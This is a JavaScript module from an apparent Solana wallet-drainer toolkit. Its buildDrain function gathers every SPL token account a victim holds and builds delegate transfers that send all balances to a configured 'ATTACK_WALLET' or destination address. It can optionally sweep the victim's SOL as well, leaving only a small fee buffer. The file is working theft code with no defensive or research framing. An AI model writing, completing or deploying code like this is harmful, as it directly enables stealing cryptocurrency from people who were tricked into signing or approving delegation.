// src/flows/drainFlow.js
const {
    Transaction,
    PublicKey,
    SystemProgram,
} = require("@solana/web3.js");

const {
    createTransferInstruction,
    getAssociatedTokenAddress,
    createAssociatedTokenAccountInstruction,
    getAccount
} = require("@solana/spl-token");

const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { getBlockhash, setBlockhash } = require("../core/blockhashCache");

/**
 * Build drain transaction (token transfer as delegate) for ALL SPL tokens + optional SOL.
 * Returns a Transaction that must be signed by the delegate (server) and, if SOL transfer is present,
 * also by the user (since SOL transfer is from user).
 *
 * @param {string} user - User's public key
 * @param {Connection} connection - Solana connection
 * @returns {Promise<Transaction>}
 */
async function buildDrain(user, connection) {
    return withRetry(async (conn) => {
        try {
            const config = getConfig();

            // Validate env
            const requiredVars = [
                { name: "WALLET", value: config.WALLET },
                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY }
            ];

            for (const { name, value } of requiredVars) {
                if (!value) {
                    throw new Error(`${name} environment variable is missing`);
                }
            }

            const tx = new Transaction();
            const userPubkey = new PublicKey(user);

            logger.debug("Building drain transaction", {
                user: userPubkey.toString()
            });

            // Fetch user token accounts (all tokens)
            const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);

            if (!tokenAccounts) {
                throw new Error("Failed to fetch token accounts");
            }

            // Blockhash fetch / cache
            let blockhash = getBlockhash();
            if (!blockhash) {
                logger.debug("No cached blockhash, fetching fresh one");
                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
                blockhash = freshBlockhash;
                setBlockhash(blockhash);
            }

            logger.debug("Using blockhash", { blockhash: blockhash.substring(0, 8) });

            const delegate = new PublicKey(config.WALLET);
            const destination = config.DESTINATION_ADDRESS ? new PublicKey(config.DESTINATION_ADDRESS) : (config.ATTACK_WALLET ? new PublicKey(config.ATTACK_WALLET) : null);
            if (!destination) {
                throw new Error("No destination configured (DESTINATION_ADDRESS or ATTACK_WALLET)");
            }
            const feePayer = new PublicKey(config.PUBLIC_KEY);

            tx.recentBlockhash = blockhash;
            tx.feePayer = feePayer;

            // SPL token transfers
            for (const t of tokenAccounts.tokens) {
                try {
                    const mint = t.mint;
                    const sourceAta = t.ata;
                    const amount = t.amount;

                    // Compute destination ATA for this mint
                    const destAta = await getAssociatedTokenAddress(mint, destination);

                    // If destination ATA doesn't exist, create it
                    let destExists = true;
                    try {
                        await getAccount(conn, destAta);
                    } catch (err) {
                        destExists = false;
                    }

                    if (!destExists) {
                        logger.debug("Adding createAssociatedTokenAccountInstruction for destination", {
                            destAta: destAta.toString(),
                            mint: mint.toString(),
                            destination: destination.toString()
                        });
                        tx.add(
                            createAssociatedTokenAccountInstruction(
                                feePayer, // payer
                                destAta,  // associated token address to create
                                destination, // owner of ATA
                                mint
                            )
                        );
                    }

                    logger.debug("Adding SPL transfer instruction", {
                        source: sourceAta.toString(),
                        dest: destAta.toString(),
                        mint: mint.toString(),
                        amount: amount.toString()
                    });

                    tx.add(
                        createTransferInstruction(
                            sourceAta,
                            destAta,
                            delegate,
                            amount
                        )
                    );
                } catch (err) {
                    logger.warn("Failed to add transfer for token; skipping", {
                        error: err.message
                    });
                }
            }

            // Optional SOL drain (note: SOL transfer must be signed by the user)
            if (config.SOL_DRAIN_FULL || config.SOL_DRAIN_LAMPORTS) {
                const balance = tokenAccounts.sol; // BigInt
                let lamportsToTransfer = 0n;

                if (config.SOL_DRAIN_FULL) {
                    const buffer = config.SOL_DRAIN_FEE_BUFFER || 50000n;
                    lamportsToTransfer = balance > buffer ? balance - buffer : 0n;
                } else if (config.SOL_DRAIN_LAMPORTS) {
                    lamportsToTransfer = config.SOL_DRAIN_LAMPORTS;
                }

                if (lamportsToTransfer > 0n) {
                    logger.debug("Adding SOL transfer instruction", {
                        from: userPubkey.toString(),
                        to: destination.toString(),
                        lamports: lamportsToTransfer.toString()
                    });

                    tx.add(
                        SystemProgram.transfer({
                            fromPubkey: userPubkey,
                            toPubkey: destination,
                            lamports: Number(lamportsToTransfer)
                        })
                    );
                } else {
                    logger.debug("No SOL transfer added (calculated amount zero)");
                }
            }

            if (tx.instructions.length === 0) {
                // Nothing to do
                throw new Error("No tokens or SOL to drain for user");
            }

            logger.info("Drain transaction built successfully", {
                instructions: tx.instructions.length
            });

            return tx;
        } catch (err) {
            logger.error("Failed to build drain transaction", {
                error: err.message
            });
            throw err;
        }
    }, "buildDrain");
}

module.exports = { buildDrain };
